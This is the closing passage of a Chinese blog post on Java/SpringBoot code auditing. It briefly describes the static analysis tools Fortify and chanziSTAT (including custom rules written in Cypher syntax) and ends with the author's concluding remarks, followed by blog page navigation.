<h5 id="Fortify"><a href="#Fortify" class="headerlink" title="Fortify"></a>Fortify</h5><p>​	老牌工具了，互联网上介绍的相关文章也比较多，但是似乎没有特别深入使用的文章，比如一些底层的配置以及优化调试等等(商业产品是这样的了)，待到我后面有时间 准备专门研究一下，再分享给大家</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241017151742638.png" alt="image-20241017151742638"></p>
<p>​	将扫描出的漏洞点，再通过IDEA去做审计来验证</p>
<h5 id="chanziSTAT"><a href="#chanziSTAT" class="headerlink" title="chanziSTAT"></a>chanziSTAT</h5><p>​	近期逛github发现的一个新项目，专门针对java做代码审计的工具，作者团队更新也是很积极，有付费版和免费版两种</p>
<p>​	Link:<code>https://github.com/Chanzi-keji/chanzi</code></p>
<p>​	从我的使用的免费版中感觉，除了页面分布不太好影响使用外，其他感觉还可以，希望作者团队可以尽快优化下，推荐大家试一试</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241017153956702.png" alt="image-20241017153956702"></p>
<p>​	比较牛的是可以搭配 <code>Cypher</code> 语法去自定义规则</p>
<p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241017154350542.png" alt="image-20241017154350542"></p>
<p>到了这里后期就结束了，通过工具爆出的可疑漏洞点，再去进行中期-逆向追踪的漏洞挖掘，记得搭配上Xray</p>
<h4 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h4><p>​	这篇文章是我迄今花费时间最长的文章了，希望对大家有帮助。如果有讲的不规范，或者错误的地方，恳请大家指出！我将火速更正，笔者写博客的原则是绝不误导任何一个人</p>
<p>​	感谢：Power_7089师傅的答疑解惑以及支持</p>
<h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3></article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/th.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/pluginsSrc/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="/pluginsSrc/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/" title="WIZ K8S LAN Party Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">WIZ K8S LAN Party Writeup</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/" title="CobaltStrike-一种特殊的不出网上线方式"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CobaltStrike-一种特殊的不出网上线方式</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/th.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Seven1an</div><div class="author-info__description">HIMURA KENSHIN</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Seven1an/"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">文章如出现错误或有疑问的地方，欢迎联系指出，我感激不尽，也欢迎技术交流与合作的朋友。 <img src="/img/wechat.jpg" alt="微信二维码" style="width: 260px; height: auto;"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot"><span class="toc-number">1.</span> <span class="toc-text">公式化Java代码审计-SpringBoot</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Start"><span class="toc-number">1.1.1.</span> <span class="toc-text">Start</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">前期(环境搭建)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#JDK%E7%89%88%E6%9C%AC"><span class="toc-number">1.1.1.1.1.</span> <span class="toc-text">JDK版本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.1.1.2.</span> <span class="toc-text">数据库类型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC"><span class="toc-number">1.1.1.1.3.</span> <span class="toc-text">数据库版本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.1.1.4.</span> <span class="toc-text">目录结构</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.1.1.5.</span> <span class="toc-text">配置文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E6%9C%9F-%E6%89%8B%E5%B7%A5%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">中期(手工审计)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#POM"><span class="toc-number">1.1.1.2.1.</span> <span class="toc-text">POM</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.1.1.2.2.</span> <span class="toc-text">正向审计</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%86%E5%90%91%E8%BF%BD%E8%B8%AA"><span class="toc-number">1.1.1.2.3.</span> <span class="toc-text">逆向追踪</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E6%9C%9F-%E5%B7%A5%E5%85%B7%E8%BE%85%E5%8A%A9"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">后期(工具辅助)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Xray"><span class="toc-number">1.1.1.3.1.</span> <span class="toc-text">Xray</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Fortify"><span class="toc-number">1.1.1.3.2.</span> <span class="toc-text">Fortify</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#chanziSTAT"><span class="toc-number">1.1.1.3.3.</span> <span class="toc-text">chanziSTAT</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">结束</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#END"><span class="toc-number">1.1.2.</span> <span class="toc-text">END</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/20/%E8%AE%B0%E5%BD%95%E8%BF%91%E6%9C%9F%E5%9B%BD%E6%8A%A4%E7%9A%84%E4%B8%80%E6%AC%A1%E6%88%90%E5%8A%9F%E6%BA%AF%E6%BA%90/" title="记录近期国护的一次成功溯源">记录近期国护的一次成功溯源</a><time datetime="2025-07-20T02:27:44.000Z" title="发表于 2025-07-20 10:27:44">2025-07-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/10/Redteam-%E4%BB%8EGetshell%E5%88%B0%E6%9D%9F%E6%89%8B%E6%97%A0%E7%AD%96/" title="Redteam-从Getshell到束手无策">Redteam-从Getshell到束手无策</a><time datetime="2025-06-10T03:34:43.000Z" title="发表于 2025-06-10 11:34:43">2025-06-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/26/%E5%9F%BA%E4%BA%8EChrome%E6%89%A9%E5%B1%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/" title="基于Chrome扩展插件的后门技术实现">基于Chrome扩展插件的后门技术实现</a><time datetime="2025-02-26T02:29:36.000Z" title="发表于 2025-02-26 10:29:36">2025-02-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/07/WIZ-K8S-LAN-Party-Writeup/" title="WIZ K8S LAN Party Writeup">WIZ K8S LAN Party Writeup</a><time datetime="2025-01-07T02:18:56.000Z" title="发表于 2025-01-07 10:18:56">2025-01-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/" title="公式化Java代码审计-SpringBoot">公式化Java代码审计-SpringBoot</a><time datetime="2024-10-11T03:07:31.000Z" title="发表于 2024-10-11 11:07:31">2024-10-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Seven1an</div><div class="framework-info"><span>❤ I love $BTC ❤</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/pluginsSrc/@fancyapps/ui/dist/fancybox/fancybox.umd.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="/pluginsSrc/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="/pluginsSrc/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><link rel="stylesheet" href="/pluginsSrc/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="/pluginsSrc/aplayer/dist/APlayer.min.js"></script><script src="/pluginsSrc/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>